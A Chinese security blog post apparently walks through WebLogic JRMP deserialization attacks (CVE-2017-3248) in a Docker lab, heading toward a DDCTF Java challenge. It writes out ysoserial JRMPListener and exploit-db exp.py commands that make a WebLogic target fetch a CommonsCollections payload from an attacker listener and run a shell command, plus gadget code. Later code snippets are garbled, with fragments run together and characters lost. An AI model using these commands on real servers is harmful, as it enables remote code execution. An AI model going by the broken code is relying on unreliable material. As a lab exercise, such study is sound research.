这篇文章将会分析weblogic JRMP问题,进而去回顾2019DDCTF中再来一杯java的那个题目,文章如果有理解错误、写错的地方,麻烦师傅们斧正。
##### 环境搭建
    $ cat docker-compose.yml
    version: '2'
    services:
     weblogic:
       image: vulhub/weblogic
       ports:
         - "8453:8453"
         - "7001:7001"
然后进入容器修改`/root/Oracle/Middleware/user_projects/domains/base_domain/bin/setDomainEnv.sh`
    if [ "${debugFlag}" = "true" ] ; then
            JAVA_DEBUG="-Xdebug -Xnoagent -Xrunjdwp:transport=dt_socket,address=${DEBUG_PORT},server=y,suspend=n -Djava.compiler=NONE"
            export JAVA_DEBUG
            JAVA_OPTIONS="${JAVA_OPTIONS} ${enableHotswapFlag} -ea -da:com.bea... -da:javelin... -da:weblogic... -ea:com.bea.wli... -ea:com.bea.broker... -ea:com.bea.sbconsole..."
            export JAVA_OPTIONS
找到这个,在前面加上
    debugFlag="true"
    expport debugFlag
重启一下,然后远程调试使用的idea,我把本地调试的代码打包放到附件里,然后导入`library`然后remote即可。
##### CVE-2017-3248
先看下攻击姿势
    java -cp ysoserial-exp.jar  ysoserial.exploit.JRMPListener 9997 CommonsCollections1 "touch /tmp/exp"
    python exp.py 127.0.0.1 7001 ~/Desktop/漏洞环境/weblogic/ysoserial-exp.jar 10.13.66.158 9997 JRMPClient
    python脚本:https://www.exploit-db.com/exploits/44553
来继续了解下什么是JRMP协议和RMI
    JRMP协议：Java远程消息交换协议 JRMP 即 Java Remote MessagingProtocol ，是特定于 Java 技术的、用于查找和引用远程对象的协议。这是运行在 Java 远程方法调用 RMI 之下、TCP/IP 之上的线路层协议。
    RMI：是Remote Method Invocation的简称，是J2SE的一部分，
    能够让程序员开发出基于Java的分布式应用。一个RMI对象是一个远程Java对象，
    可以从另一个Java虚拟机上（甚至跨过网络）调用它的方法，
    可以像调用本地Java对象的方法一样调用远程对象的方法，
    使分布在不同的JVM中的对象的外表和行为都像本地对象一样。
再来看下CVE-2017-3248部分调用链
这条链上反序列化中首先利用的还是t3协议,这篇文章我想分析的是从`cve-2017-3248`到`CVE-2018-2628`再到DDCTF的那道java题目来聊一聊防御与绕过。
t3反序列化我是看的`Dlive`大佬的这篇文章`http://d1iv3.me/2018/06/05/CVE-2015-4852-Weblogic-反序列化RCE分析/`,我们通过看文章可以知道,在t3协议通信的过程中会传输序列化数据,也就会自动的去反序列化,那么利用Gadgets,比如说传输`Commons-Collections`的payload就可以实现攻击。
在我们使用exp.py将payload攻击过去的过程中,也是利用的T3来实现的反序列化,但是如果在项目中的话找到反序列化点就可以了。
我们来看看JRMPClient中如何构造的
    public Registry getObject ( final String command ) throws Exception {
            String host;
            int port;
            int sep = command.indexOf(':');
            if ( sep  resolveProxyClass(String[] interfaces) throws IOException, ClassNotFoundException {
        String[] arr$ = interfaces;
        int len$ = interfaces.length;
        for(int i$ = 0; i$  {
        public Object getObject ( final String command ) throws Exception {
            String host;
            int port;
            int sep = command.indexOf(':');
            if ( sep < 0 ) {
                port = new Random().nextInt(65535);
                host = command;
            }
            else {